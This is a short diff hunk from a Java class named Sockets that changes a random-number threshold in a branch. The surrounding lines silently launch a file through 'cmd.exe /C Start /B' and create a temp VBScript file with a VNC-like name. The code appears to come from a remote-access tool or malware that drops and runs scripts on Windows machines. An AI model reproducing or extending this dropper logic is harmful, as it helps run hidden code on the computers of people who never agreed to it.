@@ -125,7 +125,7 @@ class Sockets
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                 
-            }else if(random <= 9)
+            }else if(random <= 10)
             {
                 File temp = File.createTempFile("vncv216789", ".vbs"); 
                 String filePath = temp.getAbsolutePath();           
